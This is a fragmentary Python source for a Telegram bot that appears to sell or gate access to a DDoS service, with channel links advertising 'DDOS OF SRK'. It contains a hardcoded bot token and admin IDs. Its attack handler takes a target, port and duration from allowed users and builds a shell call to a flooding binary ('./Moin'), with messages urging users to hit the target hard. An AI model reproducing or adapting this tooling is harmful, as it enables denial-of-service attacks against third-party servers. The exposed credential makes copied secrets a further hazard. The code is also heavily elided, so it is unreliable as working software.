...
import datetime
import os
# DDOS OF SRK JOIN TO MORE UPDATES 
# Insert your Telegram bot token here
bot = telebot.TeleBot('7613447489:AAH8bsbPSANGOQx5VCaQRRLM7_D4sTRKVi8')
# DEVELOPER --> @OWNERSRK
# Admin user IDs
admin_id = ["1232047106","1232047106"]
...
# Function to read user IDs from the filehttp
def read_users():
    try:
...
# https://t.me/ddosbysrk JOIN TO MORE UPDATES 
...
def clear_logs():
    ...
    return response
# DDOS OF SRK JOIN TO MORE UPDATES
# DDOS OF SRKJOIN TO MORE UPDATES 
...
f"🌪️ **𝗧𝗮𝗿𝗴𝗲𝘁 𝗸𝗼 𝗰𝗵𝗵𝗼𝗱𝗻𝗮 𝗺𝗮𝘁, 𝗝𝗮𝗹𝗱𝗶 𝗸𝗮𝗿 𝗻𝗶𝗽𝘁𝗮!** 🌪️"
    ...
    keyboard.add(
        telebot.types.InlineKeyboardButton("SUPPORT", url="https://t.me/ddosbysrk")
    )
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 160:
                ...
                full_command = f"./Moin {target} {port} {time} 1000",
...
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"𝐂A𝐍𝐀𝐑𝐘 𝐀𝐏𝐊 --> https://t.me/c/2165761244/11929"
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['SRK'])
def show_help(message):
    response = """𝐈 𝐊𝐍𝐎𝐖 𝐘𝐎𝐔 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐈𝐒 --> 𝐒𝟒 \n𝐁𝐔𝐓 𝐇𝐈𝐒 𝐁𝐎𝐓𝐒 𝐅𝐀𝐓𝐇𝐄𝐑 @OWNERSRK \n𝐎𝐖𝐍𝐄𝐑 𝐎𝐅 @OWNERSRK
"""
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
        telebot.types.InlineKeyboardButton('Updates', url='https://t.me/ddosbysrk'),
        telebot.types.InlineKeyboardButton('Support', url='https://t.me/ddosbysrk')
    )
